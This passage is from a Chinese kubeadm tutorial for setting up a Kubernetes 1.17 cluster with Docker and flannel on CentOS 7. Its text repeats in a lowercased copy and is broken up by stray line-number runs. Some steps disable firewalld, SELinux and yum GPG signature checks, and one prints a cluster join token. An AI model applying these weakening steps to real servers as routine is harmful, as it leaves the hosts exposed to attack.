执行脚本文件\n/bin/bash /etc/sysconfig/modules/ipvs.modules\n\n# 查看对应得模块是否加载成功\nlsmod | grep -e ip_vs -e nf_conntrack_ipv4\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n\n# 2.8 docker 安装\n\n# 之前安装过docker 卸载\nyum remove docker-*\n\n# 更换镜像地址\nwget https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo -O /etc/yum.repos.d/docker-ce.repo\n\n# 检查支持版本\nyum list docker-ce --showduplicates | sort -r\n\n# 安装\nyum install --setopt=obsoletes=0 docker-ce-18.06.3.ce-3.el7\n\n# 添加一个配置文件，docker在默认情况下使用的Cgroup Driver为cgroupfs，而kubernetes推荐使用systemd来代替cgroupfs\ncat > /etc/docker/daemon.json <<EOF\n{\n  "registry-mirrors": ["https://bk6kzfqm.mirror.aliyuncs.com"],\n  "data-root": "/data/docker",\n  "exec-opts": ["native.cgroupdriver=systemd"],\n  "log-driver": "json-file",\n  "log-opts": {\n    "max-size": "100m"\n  },\n  "storage-driver": "overlay2",\n  "storage-opts": [\n    "overlay2.override_kernel_check=true"\n  ]\n}\nEOF\n\n# 启动docker\nsystemctl restart docker\nsystemctl enable docker\n\n#检查版本\ndocker version\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n\n\n\n# 2.9 安装 kubernetes 组件\n\n由于 Kubernetes 的镜像源在国外，速度比较慢，这里切换成国内的镜像源\n\n# 添加配置文件\nvim /etc/yum.repos.d/kubernetes.repo\n[kubernetes]\nname=Kubernetes\nbaseurl=https://mirrors.aliyun.com/kubernetes/yum/repos/kubernetes-el7-x86_64\nenabled=1\ngpgcheck=0\nrepo_gpgcheck=0\ngpgkey=https://mirrors.aliyun.com/kubernetes/yum/doc/yum-key.gpg https://mirrors.aliyun.com/kubernetes/yum/doc/rpm-package-key.gpg\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n安装 kubeadm、kubelet 和 kubectl\n\nyum install --setopt=obsoletes=0 kubeadm-1.17.4-0 kubelet-1.17.4-0 kubectl-1.17.4-0\n\n\n1\n\n\n设置 kubelet 开机自启动\n\nsystemctl enable kubelet\n\n\n1\n\n\n\n# 2.10 集群初始化\n\n# 准备镜像\n\nkubeadm config images list\n\nimages=(\n    kube-apiserver:v1.17.4\n    kube-controller-manager:v1.17.4\n    kube-scheduler:v1.17.4\n    kube-proxy:v1.17.4\n    pause:3.1\n    etcd:3.4.3-0\n    coredns:1.6.5\n)\n\n\nfor imageName in ${images[@]} ;do\n    docker pull registry.cn-hangzhou.aliyuncs.com/google_containers/$imageName\n    docker tag registry.cn-hangzhou.aliyuncs.com/google_containers/$imageName k8s.gcr.io/$imageName\n    docker rmi registry.cn-hangzhou.aliyuncs.com/google_containers/$imageName\ndone\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n# 初始化\n\n在 Master 点操作如下\n\nkubeadm init \\\n  --kubernetes-version=v1.17.4 \\\n  --pod-network-cidr=10.244.0.0/16 \\\n  --service-cidr=10.96.0.0/12  \\\n  --apiserver-advertise-address=10.240.30.113\n\n\n1\n2\n3\n4\n5\n\n * kubernetes-version 为版本\n * pod-network-cidr 指定 pod 网络\n * service-cidr 指定 service 网络\n * apiserver-advertise-address 指定 master 的 IP 地址\n * image-repository registry.aliyuncs.com/google_containers 指定镜像源为阿里，前面已经拉取过镜像了，所以不需要在拉\n\n# 安装过程中报错如果报错，查看日志\njournalctl -xfeu kubelet\n\n# 重置 kubeadm 的信息\nkubeadm reset\n\n\n1\n2\n3\n4\n5\n\n\n在 Master 点创建必要的文件，是 kubectl 以后要执行的配置文件\n\n  mkdir -p $HOME/.kube\n  sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config\n  sudo chown $(id -u):$(id -g) $HOME/.kube/config\n\n\n1\n2\n3\n\n\n其他子节点执行，安装成功后会有信息告诉你\n\nkubeadm join 192.168.81.101:6443 --token d5ejth.9s60snjt5xlh9lnt \\\n    --discovery-token-ca-cert-hash sha256:04aab4993001f66f607e959b120294eddcc8579a5ea7d7364f48d84caecc90c9\n\n\n1\n2\n\n\n查看所有节点\n\nkubectl get nodes\n\n\n1\n\n\n\n# 2.11 安装网络插件\n\nkubernetes 支持多种网络插件，比如 flannel、calico、canal 等等，任选一种使用即可，本次选择 flannel\n\n# master 操作\n\n创建文件，复制执内容到文件中\n\ncat <<EOF > kube-flannel.yml\n---\napiVersion: policy/v1beta1\nkind: PodSecurityPolicy\nmetadata:\n  name: psp.flannel.unprivileged\n  annotations:\n    seccomp.security.alpha.kubernetes.io/allowedProfileNames: docker/default\n    seccomp.security.alpha.kubernetes.io/defaultProfileName: docker/default\n    apparmor.security.beta.kubernetes.io/allowedProfileNames: runtime/default\n    apparmor.security.beta.kubernetes.io/defaultProfileName: runtime/default\nspec:\n  privileged: false\n  volumes:\n    - configMap\n    - secret\n    - emptyDir\n    - hostPath\n  allowedHostPaths:\n    - pathPrefix: "/etc/cni/net.d"\n    - pathPrefix: "/etc/kube-flannel"\n    - pathPrefix: "/run/flannel"\n  readOnlyRootFilesystem: false\n  # Users and groups\n  runAsUser:\n    rule: RunAsAny\n  supplementalGroups:\n    rule: RunAsAny\n  fsGroup:\n    rule: RunAsAny\n  # Privilege Escalation\n  allowPrivilegeEscalation: false\n  defaultAllowPrivilegeEscalation: false\n  # Capabilities\n  allowedCapabilities: [\'NET_ADMIN\']\n  defaultAddCapabilities: []\n  requiredDropCapabilities: []\n  # Host namespaces\n  hostPID: false\n  hostIPC: false\n  hostNetwork: true\n  hostPorts:\n  - min: 0\n    max: 65535\n  # SELinux\n  seLinux:\n    # SELinux is unused in CaaSP\n    rule: \'RunAsAny\'\n---\nkind: ClusterRole\napiVersion: rbac.authorization.k8s.io/v1beta1\nmetadata:\n  name: flannel\nrules:\n  - apiGroups: [\'extensions\']\n    resources: [\'podsecuritypolicies\']\n    verbs: [\'use\']\n    resourceNames: [\'psp.flannel.unprivileged\']\n  - apiGroups:\n      - ""\n    resources:\n      - pods\n    verbs:\n      - get\n  - apiGroups:\n      - ""\n    resources:\n      - nodes\n    verbs:\n      - list\n      - watch\n  - apiGroups:\n      - ""\n    resources:\n      - nodes/status\n    verbs:\n      - patch\n---\nkind: ClusterRoleBinding\napiVersion: rbac.authorization.k8s.io/v1beta1\nmetadata:\n  name: flannel\nroleRef:\n  apiGroup: rbac.authorization.k8s.io\n  kind: ClusterRole\n  name: flannel\nsubjects:\n- kind: ServiceAccount\n  name: flannel\n  namespace: kube-system\n---\napiVersion: v1\nkind: ServiceAccount\nmetadata:\n  name: flannel\n  namespace: kube-system\n---\nkind: ConfigMap\napiVersion: v1\nmetadata:\n  name: kube-flannel-cfg\n  namespace: kube-system\n  labels:\n    tier: node\n    app: flannel\ndata:\n  cni-conf.json: |\n    {\n      "name": "cbr0",\n      "cniVersion": "0.3.1",\n      "plugins": [\n        {\n          "type": "flannel",\n          "delegate": {\n            "hairpinMode": true,\n            "isDefaultGateway": true\n          }\n        },\n        {\n          "type": "portmap",\n          "capabilities": {\n            "portMappings": true\n          }\n        }\n      ]\n    }\n  net-conf.json: |\n    {\n      "Network": "10.244.0.0/16",\n      "Backend": {\n        "Type": "vxlan"\n      }\n    }\n---\napiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: kube-flannel-ds-amd64\n  namespace: kube-system\n  labels:\n    tier: node\n    app: flannel\nspec:\n  selector:\n    matchLabels:\n      app: flannel\n  template:\n    metadata:\n      labels:\n        tier: node\n        app: flannel\n    spec:\n      affinity:\n        nodeAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n            nodeSelectorTerms:\n              - matchExpressions:\n                  - key: beta.kubernetes.io/os\n                    operator: In\n                    values:\n                      - linux\n                  - key: beta.kubernetes.io/arch\n                    operator: In\n                    values:\n                      - amd64\n      hostNetwork: true\n      tolerations:\n      - operator: Exists\n        effect: NoSchedule\n      serviceAccountName: flannel\n      initContainers:\n      - name: install-cni\n        image: quay.io/coreos/flannel:v0.11.0-amd64\n        command:\n        - cp\n        args:\n        - -f\n        - /etc/kube-flannel/cni-conf.json\n        - /etc/cni/net.d/10-flannel.conflist\n        volumeMounts:\n        - name: cni\n          mountPath: /etc/cni/net.d\n        - name: flannel-cfg\n          mountPath: /etc/kube-flannel/\n      containers:\n      - name: kube-flannel\n        image: quay.io/coreos/flannel:v0.11.0-amd64\n        command:\n        - /opt/bin/flanneld\n        args:\n        - --ip-masq\n        - --kube-subnet-mgr\n        resources:\n          requests:\n            cpu: "100m"\n            memory: "50Mi"\n          limits:\n            cpu: "100m"\n            memory: "50Mi"\n        securityContext:\n          privileged: false\n          capabilities:\n            add: ["NET_ADMIN"]\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - name: run\n          mountPath: /run/flannel\n        - name: flannel-cfg\n          mountPath: /etc/kube-flannel/\n      volumes:\n        - name: run\n          hostPath:\n            path: /run/flannel\n        - name: cni\n          hostPath:\n            path: /etc/cni/net.d\n        - name: flannel-cfg\n          configMap:\n            name: kube-flannel-cfg\n---\napiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: kube-flannel-ds-arm64\n  namespace: kube-system\n  labels:\n    tier: node\n    app: flannel\nspec:\n  selector:\n    matchLabels:\n      app: flannel\n  template:\n    metadata:\n      labels:\n        tier: node\n        app: flannel\n    spec:\n      affinity:\n        nodeAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n            nodeSelectorTerms:\n              - matchExpressions:\n                  - key: beta.kubernetes.io/os\n                    operator: In\n                    values:\n                      - linux\n                  - key: beta.kubernetes.io/arch\n                    operator: In\n                    values:\n                      - arm64\n      hostNetwork: true\n      tolerations:\n      - operator: Exists\n        effect: NoSchedule\n      serviceAccountName: flannel\n      initContainers:\n      - name: install-cni\n        image: quay.io/coreos/flannel:v0.11.0-arm64\n        command:\n        - cp\n        args:\n        - -f\n        - /etc/kube-flannel/cni-conf.json\n        - /etc/cni/net.d/10-flannel.conflist\n        volumeMounts:\n        - name: cni\n          mountPath: /etc/cni/net.d\n        - name: flannel-cfg\n          mountPath: /etc/kube-flannel/\n      containers:\n      - name: kube-flannel\n        image: quay.io/coreos/flannel:v0.11.0-arm64\n        command:\n        - /opt/bin/flanneld\n        args:\n        - --ip-masq\n        - --kube-subnet-mgr\n        resources:\n          requests:\n            cpu: "100m"\n            memory: "50Mi"\n          limits:\n            cpu: "100m"\n            memory: "50Mi"\n        securityContext:\n          privileged: false\n          capabilities:\n             add: ["NET_ADMIN"]\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - name: run\n          mountPath: /run/flannel\n        - name: flannel-cfg\n          mountPath: /etc/kube-flannel/\n      volumes:\n        - name: run\n          hostPath:\n            path: /run/flannel\n        - name: cni\n          hostPath:\n            path: /etc/cni/net.d\n        - name: flannel-cfg\n          configMap:\n            name: kube-flannel-cfg\n---\napiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: kube-flannel-ds-arm\n  namespace: kube-system\n  labels:\n    tier: node\n    app: flannel\nspec:\n  selector:\n    matchLabels:\n      app: flannel\n  template:\n    metadata:\n      labels:\n        tier: node\n        app: flannel\n    spec:\n      affinity:\n        nodeAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n            nodeSelectorTerms:\n              - matchExpressions:\n                  - key: beta.kubernetes.io/os\n                    operator: In\n                    values:\n                      - linux\n                  - key: beta.kubernetes.io/arch\n                    operator: In\n                    values:\n                      - arm\n      hostNetwork: true\n      tolerations:\n      - operator: Exists\n        effect: NoSchedule\n      serviceAccountName: flannel\n      initContainers:\n      - name: install-cni\n        image: quay.io/coreos/flannel:v0.11.0-arm\n        command:\n        - cp\n        args:\n        - -f\n        - /etc/kube-flannel/cni-conf.json\n        - /etc/cni/net.d/10-flannel.conflist\n        volumeMounts:\n        - name: cni\n          mountPath: /etc/cni/net.d\n        - name: flannel-cfg\n          mountPath: /etc/kube-flannel/\n      containers:\n      - name: kube-flannel\n        image: quay.io/coreos/flannel:v0.11.0-arm\n        command:\n        - /opt/bin/flanneld\n        args:\n        - --ip-masq\n        - --kube-subnet-mgr\n        resources:\n          requests:\n            cpu: "100m"\n            memory: "50Mi"\n          limits:\n            cpu: "100m"\n            memory: "50Mi"\n        securityContext:\n          privileged: false\n          capabilities:\n             add: ["NET_ADMIN"]\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - name: run\n          mountPath: /run/flannel\n        - name: flannel-cfg\n          mountPath: /etc/kube-flannel/\n      volumes:\n        - name: run\n          hostPath:\n            path: /run/flannel\n        - name: cni\n          hostPath:\n            path: /etc/cni/net.d\n        - name: flannel-cfg\n          configMap:\n            name: kube-flannel-cfg\n---\napiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: kube-flannel-ds-ppc64le\n  namespace: kube-system\n  labels:\n    tier: node\n    app: flannel\nspec:\n  selector:\n    matchLabels:\n      app: flannel\n  template:\n    metadata:\n      labels:\n        tier: node\n        app: flannel\n    spec:\n      affinity:\n        nodeAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n            nodeSelectorTerms:\n              - matchExpressions:\n                  - key: beta.kubernetes.io/os\n                    operator: In\n                    values:\n                      - linux\n                  - key: beta.kubernetes.io/arch\n                    operator: In\n                    values:\n                      - ppc64le\n      hostNetwork: true\n      tolerations:\n      - operator: Exists\n        effect: NoSchedule\n      serviceAccountName: flannel\n      initContainers:\n      - name: install-cni\n        image: quay.io/coreos/flannel:v0.11.0-ppc64le\n        command:\n        - cp\n        args:\n        - -f\n        - /etc/kube-flannel/cni-conf.json\n        - /etc/cni/net.d/10-flannel.conflist\n        volumeMounts:\n        - name: cni\n          mountPath: /etc/cni/net.d\n        - name: flannel-cfg\n          mountPath: /etc/kube-flannel/\n      containers:\n      - name: kube-flannel\n        image: quay.io/coreos/flannel:v0.11.0-ppc64le\n        command:\n        - /opt/bin/flanneld\n        args:\n        - --ip-masq\n        - --kube-subnet-mgr\n        resources:\n          requests:\n            cpu: "100m"\n            memory: "50Mi"\n          limits:\n            cpu: "100m"\n            memory: "50Mi"\n        securityContext:\n          privileged: false\n          capabilities:\n             add: ["NET_ADMIN"]\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - name: run\n          mountPath: /run/flannel\n        - name: flannel-cfg\n          mountPath: /etc/kube-flannel/\n      volumes:\n        - name: run\n          hostPath:\n            path: /run/flannel\n        - name: cni\n          hostPath:\n            path: /etc/cni/net.d\n        - name: flannel-cfg\n          configMap:\n            name: kube-flannel-cfg\n---\napiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: kube-flannel-ds-s390x\n  namespace: kube-system\n  labels:\n    tier: node\n    app: flannel\nspec:\n  selector:\n    matchLabels:\n      app: flannel\n  template:\n    metadata:\n      labels:\n        tier: node\n        app: flannel\n    spec:\n      affinity:\n        nodeAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n            nodeSelectorTerms:\n              - matchExpressions:\n                  - key: beta.kubernetes.io/os\n                    operator: In\n                    values:\n                      - linux\n                  - key: beta.kubernetes.io/arch\n                    operator: In\n                    values:\n                      - s390x\n      hostNetwork: true\n      tolerations:\n      - operator: Exists\n        effect: NoSchedule\n      serviceAccountName: flannel\n      initContainers:\n      - name: install-cni\n        image: quay.io/coreos/flannel:v0.11.0-s390x\n        command:\n        - cp\n        args:\n        - -f\n        - /etc/kube-flannel/cni-conf.json\n        - /etc/cni/net.d/10-flannel.conflist\n        volumeMounts:\n        - name: cni\n          mountPath: /etc/cni/net.d\n        - name: flannel-cfg\n          mountPath: /etc/kube-flannel/\n      containers:\n      - name: kube-flannel\n        image: quay.io/coreos/flannel:v0.11.0-s390x\n        command:\n        - /opt/bin/flanneld\n        args:\n        - --ip-masq\n        - --kube-subnet-mgr\n        resources:\n          requests:\n            cpu: "100m"\n            memory: "50Mi"\n          limits:\n            cpu: "100m"\n            memory: "50Mi"\n        securityContext:\n          privileged: false\n          capabilities:\n             add: ["NET_ADMIN"]\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - name: run\n          mountPath: /run/flannel\n        - name: flannel-cfg\n          mountPath: /etc/kube-flannel/\n      volumes:\n        - name: run\n          hostPath:\n            path: /run/flannel\n        - name: cni\n          hostPath:\n            path: /etc/cni/net.d\n        - name: flannel-cfg\n          configMap:\n            name: kube-flannel-cfg\nEOF\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n126\n127\n128\n129\n130\n131\n132\n133\n134\n135\n136\n137\n138\n139\n140\n141\n142\n143\n144\n145\n146\n147\n148\n149\n150\n151\n152\n153\n154\n155\n156\n157\n158\n159\n160\n161\n162\n163\n164\n165\n166\n167\n168\n169\n170\n171\n172\n173\n174\n175\n176\n177\n178\n179\n180\n181\n182\n183\n184\n185\n186\n187\n188\n189\n190\n191\n192\n193\n194\n195\n196\n197\n198\n199\n200\n201\n202\n203\n204\n205\n206\n207\n208\n209\n210\n211\n212\n213\n214\n215\n216\n217\n218\n219\n220\n221\n222\n223\n224\n225\n226\n227\n228\n229\n230\n231\n232\n233\n234\n235\n236\n237\n238\n239\n240\n241\n242\n243\n244\n245\n246\n247\n248\n249\n250\n251\n252\n253\n254\n255\n256\n257\n258\n259\n260\n261\n262\n263\n264\n265\n266\n267\n268\n269\n270\n271\n272\n273\n274\n275\n276\n277\n278\n279\n280\n281\n282\n283\n284\n285\n286\n287\n288\n289\n290\n291\n292\n293\n294\n295\n296\n297\n298\n299\n300\n301\n302\n303\n304\n305\n306\n307\n308\n309\n310\n311\n312\n313\n314\n315\n316\n317\n318\n319\n320\n321\n322\n323\n324\n325\n326\n327\n328\n329\n330\n331\n332\n333\n334\n335\n336\n337\n338\n339\n340\n341\n342\n343\n344\n345\n346\n347\n348\n349\n350\n351\n352\n353\n354\n355\n356\n357\n358\n359\n360\n361\n362\n363\n364\n365\n366\n367\n368\n369\n370\n371\n372\n373\n374\n375\n376\n377\n378\n379\n380\n381\n382\n383\n384\n385\n386\n387\n388\n389\n390\n391\n392\n393\n394\n395\n396\n397\n398\n399\n400\n401\n402\n403\n404\n405\n406\n407\n408\n409\n410\n411\n412\n413\n414\n415\n416\n417\n418\n419\n420\n421\n422\n423\n424\n425\n426\n427\n428\n429\n430\n431\n432\n433\n434\n435\n436\n437\n438\n439\n440\n441\n442\n443\n444\n445\n446\n447\n448\n449\n450\n451\n452\n453\n454\n455\n456\n457\n458\n459\n460\n461\n462\n463\n464\n465\n466\n467\n468\n469\n470\n471\n472\n473\n474\n475\n476\n477\n478\n479\n480\n481\n482\n483\n484\n485\n486\n487\n488\n489\n490\n491\n492\n493\n494\n495\n496\n497\n498\n499\n500\n501\n502\n503\n504\n505\n506\n507\n508\n509\n510\n511\n512\n513\n514\n515\n516\n517\n518\n519\n520\n521\n522\n523\n524\n525\n526\n527\n528\n529\n530\n531\n532\n533\n534\n535\n536\n537\n538\n539\n540\n541\n542\n543\n544\n545\n546\n547\n548\n549\n550\n551\n552\n553\n554\n555\n556\n557\n558\n559\n560\n561\n562\n563\n564\n565\n566\n567\n568\n569\n570\n571\n572\n573\n574\n575\n576\n577\n578\n579\n580\n581\n582\n583\n584\n585\n586\n587\n588\n589\n590\n591\n592\n593\n594\n595\n596\n597\n598\n599\n600\n601\n602\n603\n604\n\n\n执行以下命令\n\nkubectl apply -f kube-flannel.yml \n\n\n1\n\n\n查看节点状态，只要从 NotReady 到 Ready 就算成功\n\n\n# 服务部署\n\n部署一个 nginx 程序，测试下集群是否在正常工作，直接在 master 操作\n\n# 部署nginx\nkubectl create deployment nginx --image=nginx:1.14-alpine\n# 暴露端口\nkubectl expose deployment nginx --port=80 --type=NodePort\n\n# 查看服务状态\n[root@localhost package]# kubectl get pods,svc\nNAME                         READY   STATUS    RESTARTS   AGE\npod/nginx-6867cdf567-2l7tr   1/1     Running   0          50s\n\nNAME                 TYPE        CLUSTER-IP       EXTERNAL-IP   PORT(S)        AGE\nservice/kubernetes   ClusterIP   10.96.0.1        <none>        443/TCP        71m\nservice/nginx        NodePort    10.101.119.180   <none>        80:31543/TCP   35s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n31543 这个端口就是外部端口，可以通过节点名称 + 端口号直接访问测试',normalizedContent:'# 1 前置知识点\n\nkubernetes 集群大体上分为两类：一主多从 和 多主多从。\n\n * 一主多从：一台 mater 节点和多台 node 节点，搭建简单，但是由单机故障风险，适合用于测试环境\n * 多主多从：多台 master 节点和多台 node 节点，搭建麻烦，安全性高，适用于生产环境。\n\n\n\n\n# 1.2 安装方式\n\nkubernetes 多有多种部署方式，目前主流的方式由 kubeadm、minikube、二进制包\n\n * minikube：一个用于快速搭建单节点 kubernetes 的工具\n * kubeadm：一个用快速搭建 kubernetes 集群的工具\n * 二进制包：从官网下载每个组件的二进制包，以此去安装，此方式对于理解 kubernetes 组件更加有效\n\n> 新手推荐 kubeadm\n\n\n# 1.3 kubeadm 部署方式介绍\n\nkubeadm 是官方社区推出的一个用于快速部署 kubernetes 集群的工具，这个工具能通过两条指令完成一个 kubernetes 集群的部署：\n\n * 创建一个 master 节点 kubeadm init\n * 将 node 节点加入到当前集群中 $ kubeadm join <master 节点的 ip 和端口>\n\n> kubeadm 安装集群要求 centos7.5 及以上\n\n\n# 1.4 安装要求\n\n在开始之前，部署 kubernetes 集群机器需要满足以下几个条件：\n\n * 一台或多台机器，操作系统 centos7.x-86_x64\n * 硬件配置：2gb 或更多 ram，2 个 cpu 或更多 cpu，硬盘 30gb 或更多\n * 集群中所有机器之间网络互通\n * 可以访问外网，需要拉取镜像\n * 禁止 swap 分区\n\n\n# 1.5 最终目标\n\n * 在所有节点上安装 docker 和 kubeadm\n * 部署 kubernetes master\n * 部署容器网络插件\n * 部署 kubernetes node，将节点加入 kubernetes 集群中\n * 部署 dashboard web 页面，可视化查看 kubernetes 资源\n\n\n# 2 安装部署\n\n\n\n角色       hostname   ip               组件\nmaster   node101    192.168.81.101   docker，kubectl，kubeadm，kubelet\nnode1    node102    192.168.81.102   docker，kubectl，kubeadm，kubelet\nnode2    node103    192.168.81.103   docker，kubectl，kubeadm，kubelet\n\n> 以下没有特定说明在 master 还是 node 上操作，默认全部节点需要操作。\n\n\n# 2.1 hostname 及解析\n\n不管搭建设什么集群，切记设置好 hostname，比较方便。两个步骤完成设置：\n\n 1. 临时设置。hostname 节点名称\n 2. vim /etc/hostname\n\n设置完成后要添加解析 hostname 主机名的 ip 映射，vim /etc/hosts 直接修改\n\n192.168.81.101  node101\n192.168.81.102  node102\n192.168.81.103  node103  \n\n\n1\n2\n3\n\n\nhostname node101\n\nvim /etc/hostname\nnode101\n\n\n1\n2\n3\n4\n\n\n\n# 2.2 时间同步\n\nkubernetes 要求据群众的节点时间必须精确一致，这里直接使用 chronyd 服务从网络同步时间。企业中建议配置内部的时间同步服务器。\n\n# 启动chronyd服务\nsystemctl start chronyd\n# 设置chronyd服务开机自启动\nsystemctl enable chronyd\n# chronyd 服务启动稍等几秒钟，就可以使用data命令验证时间了\ndate\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 2.3 禁用 iptables 和 firewalld 服务\n\nkubernetes 和 docker 在运行中会产生大量的 iptables 规则，为了不让系统规则跟他们混淆，直接关闭系统的规则，生产系统建议开启，需要开放哪些端口或者 ip，手动配置。\n\n# 关闭 firewalld 服务\nsystemctl stop firewalld\nsystemctl disable firewalld\n# 关闭iptanles服务\nsystemctl stop iptables\nsystemctl disable iptables\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 2.4 禁用 selinux\n\nselinux 是 linux 系统下的一个安全服务，如果不关闭它，在安装集群中可能会被限制\n\n# 临时关闭\nsetenforce 0\n# 永久禁用\nvim /etc/selinux/config\nselinux=disabled\n\n\n1\n2\n3\n4\n5\n\n\n\n# 2.5 禁 swap 用分区\n\nswap 分区指的是虚拟内存分区，它的作用是在物理内存使用完之后，将磁盘空间虚拟成内存来使用，启用 swap 设备会对系统的性能产生非常负面的影响，因此 kubernetes 要求每个节点都要禁用 swap 设备，但是如果因为某些原因确实不能关闭 swap 分区，就需要在集群安装的过程中通过明确的参数进行配置说明。\n\n# 临时关闭\nswapoff -a\n\n# 永久关闭，编辑分区配置文件 /etc/fstab，注释掉 wap 分区一行\n#/dev/mapper/centos-swap swap                    swap    defaults        0 0\n\n\n1\n2\n3\n4\n5\n\n\n\n# 2.6 修改 linxu 的内核参数\n\n# 修改linux的内核参数，添加网桥过滤和地址转发功能\n# 编辑 /etc/sysctl.d/k8s.conf 文件，添加如下配置：\nnet.bridge.bridge-nf-call-iptables=1\nnet.bridge.bridge-nf-call-ip6tables=1\nnet.ipv4.ip_forward=1\nnet.ipv4.tcp_tw_recycle=0\nvm.swappiness=0\nvm.overcommit_memory=1\nvm.panic_on_oom=0\nfs.inotify.max_user_watches=89100\nfs.file-max=52706963\nfs.nr_open=52706963\nnet.ipv6.conf.all.disable_ipv6=1\nnet.netfilter.nf_conntrack_max=2310720\n\n# 加载网桥过滤模块\nmodprobe br_netfilter\nmodprobe ip_conntrack\n# 配置完成后重新加载配置文件\nsysctl -p /etc/sysctl.d/k8s.conf\n# 查看网桥过滤模块是否添加成功\nlsmod | grep br_netfilter\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n\n# 2.7 配置 ipvs\n\n在 kubernetes 中 service 有两种代理模型，一种是基于 iptables 的，一种是基于 ipvs 的，两者比较的话，ipvs 的性能明显更要高一些，但是如果要使用它，需要手动载入 ipvs 模块\n\n# 安装 ipset 和 ipvsadm \nyum install ipset ipvsadm -y\n\n# 添加需要加载得模块写入脚本文件\ncat <<eof > /etc/sysconfig/modules/ipvs.modules\n#!/bin/bash\nmodprobe -- ip_vs\nmodprobe -- ip_vs_rr\nmodprobe -- ip_vs_wrr\nmodprobe -- ip_vs_sh\nmodprobe -- nf_conntrack_ipv4\nmodprobe -- br_netfilter\neof\n\n# 为脚本文件添加执行权限\nchmod +x /etc/sysconfig/modules/ipvs.modules\n\n# 执行脚本文件\n/bin/bash /etc/sysconfig/modules/ipvs.modules\n\n# 查看对应得模块是否加载成功\nlsmod | grep -e ip_vs -e nf_conntrack_ipv4\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n\n# 2.8 docker 安装\n\n# 之前安装过docker 卸载\nyum remove docker-*\n\n# 更换镜像地址\nwget https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo -o /etc/yum.repos.d/docker-ce.repo\n\n# 检查支持版本\nyum list docker-ce --showduplicates | sort -r\n\n# 安装\nyum install --setopt=obsoletes=0 docker-ce-18.06.3.ce-3.el7\n\n# 添加一个配置文件，docker在默认情况下使用的cgroup driver为cgroupfs，而kubernetes推荐使用systemd来代替cgroupfs\ncat > /etc/docker/daemon.json <<eof\n{\n  "registry-mirrors": ["https://bk6kzfqm.mirror.aliyuncs.com"],\n  "data-root": "/data/docker",\n  "exec-opts": ["native.cgroupdriver=systemd"],\n  "log-driver": "json-file",\n  "log-opts": {\n    "max-size": "100m"\n  },\n  "storage-driver": "overlay2",\n  "storage-opts": [\n    "overlay2.override_kernel_check=true"\n  ]\n}\neof\n\n# 启动docker\nsystemctl restart docker\nsystemctl enable docker\n\n#检查版本\ndocker version\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n\n\n\n# 2.9 安装 kubernetes 组件\n\n由于 kubernetes 的镜像源在国外，速度比较慢，这里切换成国内的镜像源\n\n# 添加配置文件\nvim 